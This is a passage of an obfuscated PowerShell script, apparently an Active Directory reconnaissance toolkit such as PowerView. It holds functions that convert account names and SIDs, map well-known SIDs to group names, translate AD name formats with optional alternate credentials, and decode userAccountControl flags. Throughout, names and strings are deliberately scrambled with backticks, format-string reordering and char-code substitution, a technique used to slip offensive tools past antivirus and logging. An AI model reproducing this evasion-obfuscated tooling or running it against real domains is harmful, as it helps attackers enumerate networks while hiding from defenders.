    BEGIN {
        ${dO`MaInSEar`cherA`R`gume`NTS} = @{}
        if (${p`sBo`U`NdParamet`eRs}[("{1}{0}" -f 'omain','D')]) { ${DOMaIN`S`earch`E`RAr`G`UmeN`Ts}[("{1}{0}" -f'in','Doma')] = ${D`omaIn} }
        if (${P`SbouNDpar`A`M`ete`Rs}[("{1}{0}"-f 'ver','Ser')]) { ${DOMaIN`s`e`ARChERaRGU`me`NTs}[("{0}{1}{2}" -f 'Serv','e','r')] = ${s`ErVer} }
        if (${pSbOuN`D`paraM`etErS}[("{1}{0}{2}"-f'ede','Cr','ntial')]) { ${domaiN`sE`ArCh`ErarGuME`Nts}[("{0}{2}{1}"-f 'Crede','ial','nt')] = ${cre`d`eNTiAl} }
    }

    PROCESS {
        ForEach (${Ob`jECt} in ${ob`JecTn`AMe}) {
            ${OBJE`ct} = ${o`Bj`EcT} -Replace '/','\'

            if (${pS`BoUnD`PArAME`T`ERS}[("{2}{1}{3}{0}"-f 'ntial','e','Cr','de')]) {
                ${D`N} = &("{2}{1}{3}{0}"-f 'Name','vert','Con','-AD') -Identity ${oBj`e`ct} -OutputType 'DN' @DomainSearcherArguments
                if (${dn}) {
                    ${Us`erd`oMaiN} = ${dN}.("{2}{0}{1}{3}" -f 'b','Strin','Su','g').Invoke(${Dn}.("{0}{1}"-f 'Ind','exOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                    ${US`er`Name} = ${D`N}.("{0}{1}"-f'Spli','t').Invoke(',')[0].("{0}{1}"-f 'sp','lit').Invoke('=')[1]

                    ${Do`mAIN`SEaRcHe`R`ARgUMenTs}[("{0}{1}" -f 'Id','entity')] = ${us`eRNAME}
                    ${DoM`AiNSeArC`Her`A`Rgu`mEnTS}[("{0}{1}" -f 'Do','main')] = ${usERDo`m`A`IN}
                    ${d`oM`A`InsEAR`cheR`ArGU`Men`Ts}[("{1}{2}{0}" -f'perties','Pr','o')] = ("{2}{0}{1}"-f 'je','ctsid','ob')
                    &("{0}{3}{2}{1}"-f'Ge','t','Objec','t-Domain') @DomainSearcherArguments | &("{0}{1}{2}"-f 'Select','-Obj','ect') -Expand ("{0}{2}{1}"-f 'obj','d','ectsi')
                }
            }
            else {
                try {
                    if (${ob`j`eCT}.("{2}{1}{0}" -f'ins','onta','C').Invoke('\')) {
                        ${D`oMAIn} = ${ObJ`EcT}.("{0}{1}" -f 'Spl','it').Invoke('\')[0]
                        ${ObjE`Ct} = ${OBJE`CT}.("{1}{0}"-f'it','Spl').Invoke('\')[1]
                    }
                    elseif (-not ${psBouNdp`A`RAmeT`eRS}[("{0}{1}" -f 'Do','main')]) {
                        ${dOm`A`InsEARchEraRg`UM`eN`TS} = @{}
                        ${d`o`MaiN} = (&("{1}{0}{2}" -f'a','Get-Dom','in') @DomainSearcherArguments)."N`AME"
                    }

                    ${o`BJ} = (&("{0}{2}{1}{3}" -f'N','Obje','ew-','ct') ("{4}{5}{1}{2}{3}{0}{6}"-f 'ipal.NTAcco','em.Sec','urity.Pri','nc','Sy','st','unt')(${doM`AIn}, ${O`BjeCt}))
                    ${o`Bj}."t`RAn`sLAtE"([System.Security.Principal.SecurityIdentifier])."vA`lUe"
                }
                catch {
                    &("{0}{2}{3}{1}" -f'Write-','bose','Ve','r') ('[Con'+'ver'+'t'+'To'+'-SID]'+' '+'Er'+'ror '+'conve'+'rting'+' '+"$Domain\$Object "+': '+"$_")
                }
            }
        }
    }
}


function Co`N`V`ErT`FroM-Sid {


    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(MandAtOrY = ${t`RUe}, VaLueFrOmpipeLInE = ${t`RuE}, vAlUEFROMpipElInebyprOPERtynAmE = ${t`RuE})]
        [Alias('SID')]
        [ValidatePattern({"{0}{1}" -f'^S-1','-.*'})]
        [String[]]
        ${oBJ`eC`Tsid},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OMa`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{0}{2}"-f'ontro','C','ller','Domain'})]
        [String]
        ${Se`RV`eR},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREd`eNt`iaL} =   ( &('LS') ("VarIabl"+"e"+":5r0"+"V"+"K") )."va`LuE"::"E`mpTY"
    )

    BEGIN {
        ${Adn`AmearGuME`NTS} = @{}
        if (${p`sBoUND`pARa`mEteRs}[("{0}{1}"-f'Dom','ain')]) { ${aD`NaMeaR`G`UM`eNtS}[("{1}{2}{0}" -f 'n','D','omai')] = ${domA`in} }
        if (${P`Sbound`parAM`e`TeRS}[("{0}{1}"-f 'Serv','er')]) { ${ADn`Am`EARGuM`eN`TS}[("{0}{1}"-f'S','erver')] = ${S`Erv`eR} }
        if (${p`sbO`U`Nd`Pa`RamEtErS}[("{0}{2}{1}" -f'Cr','l','edentia')]) { ${a`D`NAME`ArGuME`NTS}[("{1}{0}{2}" -f'dentia','Cre','l')] = ${cr`ED`ENtIal} }
    }

    PROCESS {
        ForEach (${TAr`Ge`Ts`id} in ${oB`Jec`TsId}) {
            ${ta`RG`etsID} = ${Ta`RG`ETSid}.("{1}{0}" -f 'rim','t').Invoke('*')
            try {
                
                Switch (${tA`RGe`TsId}) {
                    ("{0}{1}" -f'S-1','-0')         { ("{4}{2}{0}{1}{3}" -f 'u','th','ull A','ority','N') }
                    ("{2}{1}{0}"-f'1-0-0','-','S')       { ("{0}{2}{1}"-f 'Nobo','y','d') }
                    ("{1}{0}"-f'-1-1','S')         { ("{1}{2}{3}{0}" -f'hority','Wor','ld',' Aut') }
                    ("{0}{1}" -f'S-1-1-','0')       { ("{1}{0}{2}" -f'yo','Ever','ne') }
                    ("{1}{0}"-f'-1-2','S')         { ("{0}{3}{1}{2}{4}"-f'Loca',' Au','thorit','l','y') }
                    ("{0}{1}" -f'S-1-2','-0')       { ("{0}{1}"-f'L','ocal') }
                    ("{1}{2}{0}" -f'-1','S-1','-2')       { ("{4}{0}{2}{3}{1}"-f'ons','Logon ','o','le ','C') }
                    ("{1}{0}" -f '1-3','S-')         { ("{2}{0}{1}{3}" -f'ator A','uthori','Cre','ty') }
                    ("{1}{0}{2}" -f '1-3','S-','-0')       { ("{2}{1}{3}{0}" -f 'r','tor ','Crea','Owne') }
                    ("{1}{2}{0}" -f'-1','S-1-','3')       { ("{2}{1}{0}"-f'p','or Grou','Creat') }
                    ("{1}{0}{2}"-f '-1-3','S','-2')       { ("{0}{2}{3}{5}{1}{4}" -f 'Cr','e','eator',' Owner Ser','r','v') }
                    ("{1}{0}" -f'-3','S-1-3')       { ("{6}{3}{0}{5}{2}{4}{1}"-f'Group','r','erv','r ','e',' S','Creato') }
                    ("{0}{1}"-f 'S-1-','3-4')       { ("{0}{3}{1}{2}"-f'Ow','ght','s','ner Ri') }
                    ("{1}{0}" -f'-1-4','S')         { ("{3}{1}{2}{0}{4}"-f 'ori','unique Au','th','Non-','ty') }
                    ("{0}{1}"-f'S-','1-5')         { ("{2}{3}{0}{1}"-f ' ','Authority','N','T') }
                    ("{1}{0}{2}"-f'-1-5','S','-1')       { ("{0}{1}" -f'Dial','up') }
                    ("{2}{1}{0}"-f'-5-2','1','S-')       { ("{0}{1}{2}"-f'Ne','twor','k') }
                    ("{1}{0}"-f '-3','S-1-5')       { ("{0}{1}" -f 'Ba','tch') }
                    ("{1}{0}{2}"-f '-1-','S','5-4')       { ("{0}{2}{1}{3}"-f'Inte','v','racti','e') }
                    ("{2}{0}{1}" -f'-5','-6','S-1')       { ("{0}{1}{2}" -f'S','ervi','ce') }
                    ("{0}{1}"-f'S-1-5-','7')       { ("{1}{0}{2}" -f 'non','A','ymous') }
                    ("{1}{2}{0}"-f '-5-8','S','-1')       { ("{1}{0}"-f 'xy','Pro') }
                    ("{1}{2}{0}" -f '5-9','S-1','-')       { ("{2}{1}{5}{4}{0}{3}{6}" -f'ro','ri','Enterp','ll','in Cont','se Doma','ers') }
                    ("{1}{0}"-f '1-5-10','S-')      { ("{1}{2}{0}{3}" -f' ','Princi','pal','Self') }
                    ("{1}{2}{0}"-f'1','S','-1-5-1')      { ("{3}{5}{4}{2}{0}{1}" -f' Us','ers','ted','Au','ica','thent') }
                    ("{1}{0}{2}"-f '5','S-1-','-12')      { ("{1}{0}{3}{2}"-f 'stricte','Re','e','d Cod') }
                    ("{1}{2}{0}"-f'3','S-1','-5-1')      { ("{5}{4}{0}{3}{6}{1}{2}"-f'rv','r','s','er','erminal Se','T',' Use') }
                    ("{1}{0}{2}"-f '1','S-','-5-14')      { ("{1}{0}{4}{2}{5}{3}" -f'Inte','Remote ','t',' Logon','rac','ive') }
                    ("{2}{0}{1}"-f'-','15','S-1-5')      { ("{0}{2}{3}{1}"-f 'Th','nization ','i','s Orga') }
                    ("{0}{1}" -f'S-1-5-1','7')      { ("{2}{3}{0}{4}{1}"-f's','n ','Th','i',' Organizatio') }
                    ("{2}{0}{1}"-f'1','-5-18','S-')      { ("{1}{0}{2}" -f'cal ','Lo','System') }
                    ("{2}{0}{1}"-f '-5-1','9','S-1')      { ("{2}{1}{0}"-f'y','T Authorit','N') }
                    ("{2}{1}{0}" -f'-20','1-5','S-')      { ("{0}{2}{1}" -f 'N','rity','T Autho') }
                    ("{2}{0}{3}{1}"-f '-','0-0','S','1-5-8')    { ("{2}{0}{3}{1}"-f'll S','ices ','A','erv') }
                    ("{2}{3}{0}{1}" -f'-5-','32-544','S','-1')  { ((("{1}{5}{2}{0}{3}{6}{4}"-f'0}A','BUI','{','dministra','s','LTIN','tor'))  -f [cHAR]92) }
                    ("{0}{2}{3}{1}"-f'S-1-5','5','-32-5','4')  { ((("{3}{4}{1}{2}{0}"-f 'ers','U','s','BUI','LTINXwn')).("{0}{1}" -f 'ReP','lACE').Invoke('Xwn','\')) }
                    ("{3}{0}{1}{2}" -f '-5-32-','54','6','S-1')  { ((("{1}{0}{4}{2}{3}"-f 'T','BUIL','C','nBGuests','IN'))."Re`plAcE"(([chAR]67+[chAR]110+[chAR]66),'\')) }
                    ("{0}{1}{2}"-f'S-1-5-3','2-5','47')  { ((("{3}{1}{2}{0}"-f'INygMPower Users','IL','T','BU')).("{1}{2}{0}"-f 'ACe','rE','pl').Invoke('ygM','\')) }
                    ("{1}{0}{2}" -f '2-54','S-1-5-3','8')  { ((("{3}{5}{4}{0}{1}{2}"-f'9Account Op','e','rators','B','KU','UILTIN'))-rEPLaCE([ChAR]75+[ChAR]85+[ChAR]57),[ChAR]92) }
                    ("{2}{0}{3}{1}" -f '1-5','-549','S-','-32')  { ((("{3}{4}{5}{6}{0}{2}{1}"-f' O','s','perator','BUILTIN','kPY','Se','rver'))."R`epLACE"(([CHAR]107+[CHAR]80+[CHAR]89),'\')) }
                    ("{3}{1}{2}{0}"-f'5-32-550','1','-','S-')  { ((("{1}{3}{2}{0}{5}{4}" -f 'O','BUIL','INbiRPrint ','T','rs','perato'))-ReplaCE  'biR',[cHAr]92) }
                    ("{1}{0}{2}{3}"-f'1-5','S-','-32','-551')  { ((("{1}{2}{4}{3}{0}"-f'perators','BUILT','INDTl','O','Backup '))  -rePLACE ([cHaR]68+[cHaR]84+[cHaR]108),[cHaR]92) }
                    ("{3}{2}{1}{0}"-f '552','-5-32-','-1','S')  { ((("{0}{3}{4}{2}{1}"-f'BU','ators','eplic','ILTIN{0','}R'))  -F [ChAR]92) }
                    ("{1}{0}{3}{2}"-f '-32','S-1-5','554','-')  { ((("{5}{0}{6}{4}{1}{7}{3}{2}"-f 'ILTINLhBPr',' Ac','ss','e','ible','BU','e-Windows 2000 Compat','c'))-ReplAce  ([cHAr]76+[cHAr]104+[cHAr]66),[cHAr]92) }
                    ("{0}{2}{1}"-f 'S-','2-555','1-5-3')  { ((("{0}{1}{6}{2}{5}{4}{3}{7}" -f 'BUILTI','N{',' D','U','p ','eskto','0}Remote','sers'))  -f [ChAr]92) }
                    ("{2}{1}{0}"-f'56','1-5-32-5','S-')  { ((("{0}{5}{1}{8}{9}{10}{2}{7}{4}{11}{6}{3}" -f'BU','TIN','igu','rs','i','IL','Operato','rat','4Ot','Network ','Conf','on '))-CrEPlACE([CHAr]52+[CHAr]79+[CHAr]116),[CHAr]92) }
                    ("{2}{0}{1}"-f '5-32-','557','S-1-')  { ((("{3}{2}{0}{10}{11}{8}{1}{7}{6}{5}{9}{4}" -f'}',' Tr','N{0','BUILTI','ders','i','st Bu','u','t','l','Incoming For','es')) -F[cHAR]92) }
                    ("{3}{0}{2}{1}"-f'32-','58','5','S-1-5-')  { ((("{9}{8}{0}{4}{2}{6}{3}{1}{5}{7}"-f 'LTIN','oni','r','mance M','wJNPe','tor Us','for','ers','UI','B')) -Replace  ([CHAr]119+[CHAr]74+[CHAr]78),[CHAr]92) }
                    ("{3}{1}{2}{0}" -f '2-559','1-','5-3','S-')  { ((("{0}{5}{7}{3}{2}{6}{4}{1}"-f'B','g Users','form','r','nce Lo','UILTINT6','a','NPe'))."REP`laCe"(([CHaR]84+[CHaR]54+[CHaR]78),'\')) }
                    ("{1}{0}{2}{3}" -f'-5-32-5','S-1','6','0')  { ((("{6}{4}{0}{3}{2}{5}{1}"-f'horizat','ss Group','c','ion Ac','TINJLTWindows Aut','e','BUIL'))  -CRePLaCe  'JLT',[CHar]92) }
                    ("{0}{1}{2}"-f 'S-1-5-32-','56','1')  { ((("{1}{3}{2}{6}{0}{7}{4}{8}{5}" -f'r ','BUILTINw','in','KgTerm','icense ','s','al Serve','L','Server')) -crePLAcE'wKg',[cHAR]92) }
                    ("{2}{0}{1}{3}"-f'-1-5-3','2-5','S','62')  { ((("{7}{0}{2}{4}{3}{1}{6}{5}"-f'pDistrib','s','ut',' COM U','ed','rs','e','BUILTINjD'))  -crEPLace  'jDp',[chAR]92) }
                    ("{1}{2}{0}"-f'9','S-1-5','-32-56')  { ((("{7}{5}{0}{1}{2}{9}{3}{6}{4}{8}"-f 'Cryp','to','gr','p',' Op','UILTINhFi','hic','B','erators','a'))."RE`PlACE"(([CHAr]104+[CHAr]70+[CHAr]105),'\')) }
                    ("{1}{0}{2}"-f'-5','S-1-5-32','73')  { ((("{0}{2}{3}{1}{4}" -f 'BU','Ev','ILTINXs','f','ent Log Readers'))-RepLaCe'Xsf',[CHar]92) }
                    ("{2}{1}{0}{3}"-f'5-3','-','S-1','2-574')  { ((("{2}{0}{1}{4}{5}{6}{7}{3}" -f'UIL','TINN','B','OM Access','1tCert','ificate ','Service ','DC'))-RepLace  'N1t',[cHar]92) }
                    ("{0}{3}{2}{1}" -f'S-1-5','5','57','-32-')  { ((("{3}{9}{7}{6}{5}{8}{1}{0}{2}{4}"-f'er','ess S','ve','BU','rs',' Remote','CRDS','LTINu9',' Acc','I'))."re`pLA`ce"('u9C',[STriNG][ChAr]92)) }
                    ("{1}{2}{0}"-f'576','S-1-5-32','-')  { ((("{2}{4}{6}{0}{5}{3}{1}{7}" -f'N{0','e','BU','nt S','IL','}RDS Endpoi','TI','rvers'))-F [ChAR]92) }
                    ("{2}{1}{0}"-f'7','1-5-32-57','S-')  { ((("{8}{3}{2}{6}{7}{0}{5}{4}{1}{9}"-f'a',' ','L','UI','ent','gem','TINumP','RDS Man','B','Servers'))-cREplaCe  'umP',[cHAR]92) }
                    ("{1}{2}{0}{3}" -f'57','S-1-','5-32-','8')  { ((("{1}{2}{8}{4}{3}{9}{6}{7}{5}{0}"-f'rs','BUILTI','NaKMHy','V ','er-','ato','inist','r','p','Adm'))."re`pLACE"(([ChAr]97+[ChAr]75+[ChAr]77),'\')) }
                    ("{3}{1}{2}{0}" -f'9','5-','32-57','S-1-')  { ((("{1}{4}{5}{7}{8}{2}{0}{6}{3}"-f' ','BUILTINmC','ntrol','ance Operators','QA','c','Assist','cess C','o'))  -RepLace  'mCQ',[chAR]92) }
                    ("{0}{1}{2}"-f'S-1','-5','-32-580')  { ((("{1}{11}{12}{10}{9}{4}{7}{6}{3}{0}{2}{8}{5}"-f'p','BUIL','era','nce O','trol','rs','ssista',' A','to','n','Co','TI','N{0}Access '))  -F[chAR]92) }
                    ("{0}{1}"-f'Defau','lt') {
                        &("{1}{3}{0}{2}"-f'DNam','Co','e','nvert-A') -Identity ${TarG`Et`SiD} @ADNameArguments
                    }
                }
            }
            catch {
                &("{2}{1}{0}" -f 'bose','rite-Ver','W') ('[Conver'+'t'+'From-S'+'ID]'+' '+'E'+'rror '+'con'+'v'+'e'+'rting '+'S'+'ID '+"'$TargetSid' "+': '+"$_")
            }
        }
    }
}


function cONVErt-`AD`NAmE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{5}{3}{0}{7}{8}{6}{1}{2}" -f'rSta','unction','s','ssFo','PSUseS','houldProce','gingF','te','Chan'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(mANdatOrY = ${t`RUe}, VAlUEFROmPipelINE = ${tr`Ue}, VaLuEFRompIpelINebYPRopERtYNAmE = ${tR`UE})]
        [Alias({"{1}{0}" -f'ame','N'}, {"{2}{0}{1}" -f'ect','Name','Obj'})]
        [String[]]
        ${IDe`N`T`iTY},

        [String]
        [ValidateSet('DN', {"{0}{2}{1}" -f 'Canon','l','ica'}, 'NT4', {"{1}{0}"-f 'splay','Di'}, {"{3}{2}{1}{0}"-f'mple','nSi','omai','D'}, {"{3}{4}{0}{2}{1}" -f 's','mple','eSi','Ente','rpri'}, {"{0}{1}" -f'GU','ID'}, {"{0}{1}"-f'Un','known'}, 'UPN', {"{1}{0}{2}"-f 'nic','Cano','alEx'}, 'SPN')]
        ${oUT`putt`Y`pe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMaIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}{4}{3}" -f 'Doma','nCont','i','er','roll'})]
        [String]
        ${Se`R`Ver},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`edEN`TIal} =  (&("{1}{0}"-f'iR','D') ("{1}{2}{0}"-f'Vk','vARiA','BLE:5R0'))."vaL`UE"::"em`ptY"
    )

    BEGIN {
        ${N`AmEtyP`es} = @{
            'DN'                =   1  
            ("{2}{1}{0}" -f 'ical','non','Ca')         =   2  
            'NT4'               =   3  
            ("{2}{1}{0}"-f 'lay','sp','Di')           =   4  
            ("{3}{1}{0}{2}"-f 'ainSi','m','mple','Do')      =   5  
            ("{1}{3}{0}{2}{4}"-f't','E','erpriseSi','n','mple')  =   6  
            ("{0}{1}"-f 'G','UID')              =   7  
            ("{1}{0}" -f'nown','Unk')           =   8  
            'UPN'               =   9  
            ("{1}{0}{3}{2}" -f 'non','Ca','calEx','i')       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }

        
        function INvo`KE-m`eT`HOd([__ComObject] ${obJe`ct}, [String] ${m`E`ThoD}, ${pAr`AME`TERS}) {
            ${o`UT`put} = ${nU`LL}
            ${O`U`TpUT} = ${oBJ`e`cT}.("{2}{0}{1}"-f'y','pe','GetT').Invoke().("{1}{0}{3}{2}"-f'vokeMe','In','er','mb').Invoke(${Me`ThoD}, ("{1}{2}{0}"-f'hod','Invok','eMet'), ${N`ULl}, ${OBj`e`CT}, ${p`ARamete`RS})
            &("{1}{0}{2}{3}"-f 'te-Out','Wri','p','ut') ${o`UT`PUT}
        }

        function gET`-`pRo`pERTY([__ComObject] ${OB`J`ECT}, [String] ${pRo`p`ERty}) {
            ${oBJ`e`cT}.("{0}{1}" -f'GetT','ype').Invoke().("{1}{0}{2}{3}" -f'nvok','I','e','Member').Invoke(${PR`oPEr`Ty}, ("{0}{1}{2}"-f 'GetP','r','operty'), ${nU`LL}, ${ObjE`ct}, ${n`ULL})
        }

        function set-`pr`oPEr`Ty([__ComObject] ${ObJ`e`ct}, [String] ${pROP`ERTy}, ${p`ARamE`Te`RS}) {
            [Void] ${ob`j`ect}.("{2}{0}{1}"-f'etT','ype','G').Invoke().("{1}{2}{0}"-f'er','InvokeMem','b').Invoke(${PrOpe`R`TY}, ("{0}{1}{3}{2}"-f 'Se','tP','perty','ro'), ${nu`Ll}, ${O`BjE`Ct}, ${Pa`R`AmET`ERS})
        }

        
        if (${p`sBoUNDP`A`RAME`Te`Rs}[("{0}{1}" -f'Serve','r')]) {
            ${Ads`INITty`Pe} = 2
            ${iNItn`A`ME} = ${s`ERv`Er}
        }
        elseif (${p`sbouNdpARa`meT`eRs}[("{0}{2}{1}"-f'D','in','oma')]) {
            ${aD`s`initTypE} = 1
            ${INITn`AMe} = ${dO`mA`IN}
        }
        elseif (${psb`OU`NDpArA`mET`eRs}[("{2}{0}{1}" -f 'nti','al','Crede')]) {
            ${c`ReD} = ${C`ReD`entI`Al}.("{2}{1}{3}{0}"-f 'al','reden','GetNetworkC','ti').Invoke()
            ${aDSIN`itt`Y`Pe} = 1
            ${i`N`iTn`AME} = ${c`RED}."do`MA`In"
        }
        else {
            
            ${aDsInIT`T`ype} = 3
            ${iNIt`Na`mE} = ${n`ULL}
        }
    }

    PROCESS {
        ForEach (${T`A`RG`EtiDENt`Ity} in ${I`dENt`iTY}) {
            if (-not ${PsBOu`ND`par`AmE`TE`RS}[("{3}{1}{0}{2}"-f't','pu','Type','Out')]) {
                if (${TARgE`T`ideNt`i`Ty} -match ((("{7}{6}{3}{5}{2}{0}{4}{1}" -f 'sU[',' ]+','sUt','-Za-z]+','A-Za-z','t','A','^['))."reP`l`ACE"(([cHar]116+[cHar]115+[cHar]85),'\'))) {
                    ${Ad`SO`UTPutty`PE} = ${naMe`Typ`eS}[("{1}{0}{2}" -f 'Simp','Domain','le')]
                }
                else {
                    ${A`DS`OU`TPUTTYpe} = ${NAm`E`T`yPes}['NT4']
                }
            }
            else {
                ${ADSoUtPU`T`TYPE} = ${namEt`yP`eS}[${oUT`pu`TTY`pe}]
            }

            ${TRa`NsLa`Te} = &("{1}{0}{2}"-f '-','New','Object') -ComObject ("{2}{0}{1}"-f'eTranslat','e','Nam')

            if (${ps`BOuNdP`A`RA`Met`ErS}[("{1}{2}{0}{3}" -f'edent','C','r','ial')]) {
                try {
                    ${c`ReD} = ${CREdEnT`I`Al}.("{2}{0}{4}{3}{1}{5}" -f 't','kCre','Ge','etwor','N','dential').Invoke()

                    &("{1}{3}{2}{0}" -f 'od','In','-Meth','voke') ${TRAns`l`ATE} ("{1}{0}"-f'Ex','Init') (
                        ${ADsIN`i`T`TYPe},
                        ${i`NITnamE},
                        ${cr`ED}."U`SE`RnAme",
                        ${cR`Ed}."DoM`AiN",
                        ${C`REd}."pAsS`woRd"
                    )
                }
                catch {
                    &("{0}{2}{1}"-f'Wri','se','te-Verbo') ('['+'Convert-'+'AD'+'Nam'+'e'+'] '+'Err'+'o'+'r '+'in'+'iti'+'alizing '+'tr'+'ansla'+'tion'+' '+'f'+'or '+"'$Identity' "+'using'+' '+'a'+'l'+'ternat'+'e '+'cred'+'entia'+'l'+'s '+': '+"$_")
                }
            }
            else {
                try {
                    ${n`Ull} = &("{0}{1}{2}{3}"-f 'Invo','k','e-M','ethod') ${TRAn`Sla`TE} ("{0}{1}"-f'I','nit') (
                        ${AD`s`IN`ittyPe},
                        ${i`Ni`TnaMe}
                    )
                }
                catch {
                    &("{0}{1}{2}" -f'Write-','Verbo','se') ('['+'Con'+'vert-AD'+'N'+'ame'+'] '+'E'+'rror '+'in'+'it'+'ializing '+'trans'+'lat'+'ion'+' '+'fo'+'r '+"'$Identity' "+': '+"$_")
                }
            }

            
            &("{3}{0}{2}{1}" -f'-P','y','ropert','Set') ${T`Ra`NsLAte} ("{2}{3}{4}{1}{0}"-f'l','rra','Ch','aseRe','fe') (0x60)

            try {
                
                ${nU`ll} = &("{3}{2}{1}{0}"-f 'od','h','e-Met','Invok') ${TrAN`S`LAtE} 'Set' (8, ${T`ARGEt`IDe`NTiTy})
                &("{0}{1}{2}" -f 'Invok','e-','Method') ${TRan`s`LATE} 'Get' (${Ad`soutput`T`YpE})
            }
            catch [System.Management.Automation.MethodInvocationException] {
                &("{3}{4}{0}{2}{1}"-f 'r','ose','b','Write','-Ve') "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message) "
            }
        }
    }
}


function co`NVeRTFR`oM-`U`A`CVAL`UE {


    [OutputType({"{5}{12}{10}{8}{7}{3}{6}{9}{2}{1}{11}{13}{4}{0}" -f 'ry','ere','ed.Ord','ns.','ctiona','System','Speciali','io','ct','z','Colle','d','.','Di'})]
    [CmdletBinding()]
    Param(
        [Parameter(MaNdAtory = ${t`RUe}, vAlUeFROmpIPELINe = ${T`RUe}, vaLuEfroMPipeLInEbYPrOPertyNAme = ${T`RUe})]
        [Alias('UAC', {"{1}{0}{4}{2}{3}"-f 'ount','useracc','t','rol','con'})]
        [Int]
        ${vA`LuE},

        [Switch]
        ${Sh`O`wALl}
    )

    BEGIN {
        
        ${u`ACVA`LueS} = &("{2}{0}{1}" -f'Obje','ct','New-') ("{7}{5}{8}{6}{3}{1}{4}{2}{0}"-f'Dictionary','e','d','.Ord','re','Co','alized','System.','llections.Speci')
        ${uaCV`AL`UeS}.("{0}{1}"-f 'A','dd').Invoke(("{0}{1}" -f'SCR','IPT'), 1)
        ${uA`CvAL`UEs}.("{0}{1}" -f 'Ad','d').Invoke(("{3}{0}{2}{1}"-f 'IS','LE','AB','ACCOUNTD'), 2)
        ${UA`cV`AluEs}.("{0}{1}"-f 'Ad','d').Invoke(("{1}{2}{3}{0}" -f 'D','HO','MEDIR_REQ','UIRE'), 8)
        ${UaCV`AL`Ues}.("{1}{0}"-f'dd','A').Invoke(("{2}{0}{1}"-f'OCKO','UT','L'), 16)
        ${UaCv`Al`UEs}.("{0}{1}"-f'Ad','d').Invoke(("{2}{1}{0}" -f 'EQD','WD_NOTR','PASS'), 32)
        ${ua`C`VA`LUEs}.("{0}{1}"-f'Ad','d').Invoke(("{1}{0}{3}{4}{2}" -f 'SW','PAS','CANT_CHANGE','D','_'), 64)
        ${uAcvAL`U`es}.("{0}{1}" -f 'A','dd').Invoke(("{4}{2}{0}{5}{1}{3}" -f 'CR','_','N','ALLOWED','E','YPTED_TEXT_PWD'), 128)
        ${Ua`cVA`l`Ues}.("{0}{1}" -f'Ad','d').Invoke(("{1}{3}{6}{2}{4}{0}{5}"-f 'ATE_AC','T','LI','EM','C','COUNT','P_DUP'), 256)
        ${uaCvA`lU`ES}.("{0}{1}"-f 'A','dd').Invoke(("{1}{3}{0}{2}"-f 'U','NO','NT','RMAL_ACCO'), 512)
        ${Ua`CvA`Lu`Es}.("{0}{1}"-f'A','dd').Invoke(("{1}{4}{0}{3}{2}"-f'_TRU','INTERDOM','NT','ST_ACCOU','AIN'), 2048)
        ${UAc`Va`Lu`Es}.("{0}{1}"-f'Ad','d').Invoke(("{6}{1}{0}{2}{4}{3}{5}" -f 'TATIO','S','N_TRUS','A','T_','CCOUNT','WORK'), 4096)
        ${ua`C`VAluEs}.("{1}{0}"-f'dd','A').Invoke(("{5}{4}{0}{3}{2}{1}" -f 'RU','OUNT','ACC','ST_','ERVER_T','S'), 8192)
        ${U`ACvaL`UeS}.("{0}{1}"-f 'A','dd').Invoke(("{5}{4}{2}{1}{0}{3}"-f 'W','PASS','E_','ORD','T_EXPIR','DON'), 65536)
        ${uAcVa`l`UEs}.("{0}{1}"-f'A','dd').Invoke(("{3}{0}{1}{2}{4}" -f'S_LOG','ON_ACCOU','N','MN','T'), 131072)
        ${U`ACvAlU`es}.("{0}{1}" -f'A','dd').Invoke(("{0}{1}{2}{3}" -f'SMARTCARD','_REQU','IRE','D'), 262144)
        ${UaC`V`Alu`Es}.("{0}{1}"-f'A','dd').Invoke(("{0}{3}{2}{1}{4}" -f'TRUSTED_FO','LEG','DE','R_','ATION'), 524288)
        ${U`Ac`VaLUES}.("{0}{1}"-f'A','dd').Invoke(("{3}{2}{0}{1}" -f 'L','EGATED','T_DE','NO'), 1048576)
        ${uacva`L`UES}.("{1}{0}" -f 'dd','A').Invoke(("{3}{2}{1}{0}" -f 'EY_ONLY','_K','S','USE_DE'), 2097152)
        ${u`ACV`AlUeS}.("{0}{1}"-f'Ad','d').Invoke(("{1}{3}{2}{0}"-f'H','DO','T_REQ_PREAUT','N'), 4194304)
        ${Ua`CV`AlUEs}.("{0}{1}" -f 'Ad','d').Invoke(("{4}{2}{0}{3}{1}"-f'RD_','D','ASSWO','EXPIRE','P'), 8388608)
        ${ua`Cv`ALUes}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{4}{2}{1}{3}{6}{5}"-f 'T','AUTH','STED_TO_','_','RU','GATION','FOR_DELE'), 16777216)
        ${U`ACva`luEs}.("{1}{0}"-f 'dd','A').Invoke(("{2}{0}{3}{5}{4}{1}{6}"-f '_SECRE','N','PARTIAL','TS','CCOU','_A','T'), 67108864)
    }

    PROCESS {
        ${RESULt`UA`c`V`A`lUes} = &("{3}{2}{1}{0}" -f'ject','w-Ob','e','N') ("{4}{7}{6}{9}{13}{3}{1}{2}{0}{5}{11}{8}{10}{12}" -f'z','ons.Special','i','ti','Syst','e','ol','em.C','der','l','ed','d.Or','Dictionary','ec')

        if (${S`h`OwAll}) {
            ForEach (${uaC`VAl`Ue} in ${uacva`Lu`Es}.("{0}{2}{1}" -f 'GetEnum','ator','er').Invoke()) {
                if ( (${VAl`Ue} -band ${U`ACva`lUe}."VAl`Ue") -eq ${UA`c`V`Alue}."v`ALUE") {
                    ${RESulT`UaCva`LU`es}.("{1}{0}" -f 'dd','A').Invoke(${U`AcV`ALUE}."NA`me", "$($UACValue.Value)+")
                }
                else {
                    ${re`sU`ltua`cVa`lUES}.("{0}{1}"-f 'A','dd').Invoke(${ua`cVal`UE}."nA`mE", "$($UACValue.Value)")
                }
            }
        }
        else {
